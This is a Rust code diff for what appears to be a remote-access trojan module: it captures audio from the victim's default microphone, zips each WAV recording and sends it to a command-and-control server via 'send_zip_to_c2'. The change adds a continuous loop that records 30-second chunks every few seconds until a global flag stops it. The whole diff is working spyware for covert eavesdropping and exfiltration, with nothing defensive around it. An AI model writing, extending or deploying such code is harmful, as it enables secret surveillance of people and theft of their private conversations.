@@ -1,14 +1,17 @@
 use anyhow::Result;
 use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
 use hound::{WavSpec, WavWriter};
-use std::sync::{Arc, Mutex};
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::{Arc, Mutex, OnceLock};
 use std::time::Duration;
 use tempfile::NamedTempFile;
 use tokio::sync::Mutex as AsyncMutex;
 
 use crate::connexion::{send_zip_to_c2, zip_file};
 
-pub async fn record_mic() -> Result<()> {
+static MIC_REC_FLAG: OnceLock<Arc<AtomicBool>> = OnceLock::new();
+
+pub async fn record_mic(duration_secs: u64) -> Result<()> {
     let host = cpal::default_host();
 
     let device = match host.default_input_device() {
@@ -84,7 +87,7 @@ pub async fn record_mic() -> Result<()> {
 
     stream.play()?;
 
-    tokio::time::sleep(Duration::from_secs(10)).await;
+    tokio::time::sleep(Duration::from_secs(duration_secs)).await;
 
     drop(stream);
 
@@ -101,5 +104,33 @@ pub async fn record_mic() -> Result<()> {
 
     let _ = send_zip_to_c2(zip_path).await;
 
+    Ok(())
+}
+
+pub fn init_mic_rec_flag() -> Arc<AtomicBool> {
+    MIC_REC_FLAG
+        .get_or_init(|| Arc::new(AtomicBool::new(true)))
+        .clone()
+}
+
+pub fn stop_mic_rec() {
+    if let Some(flag) = MIC_REC_FLAG.get() {
+        flag.store(false, Ordering::SeqCst);
+    }
+}
+
+pub async fn mic_rec_loop(flag: Arc<AtomicBool>) -> anyhow::Result<()> {
+    while flag.load(Ordering::SeqCst) {
+        println!("[MIC] Enregistrement de 30 secondes");
+        record_mic(30).await?;
+        println!("[MIC] Pause de 5 secondes avant prochain enregistrement");
+        for _ in 0..5 {
+            if !flag.load(Ordering::SeqCst) {
+                break;
+            }
+            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+        }
+    }
+    println!("[MIC] Boucle d'enregistrement arrêtée proprement");
     Ok(())
 }
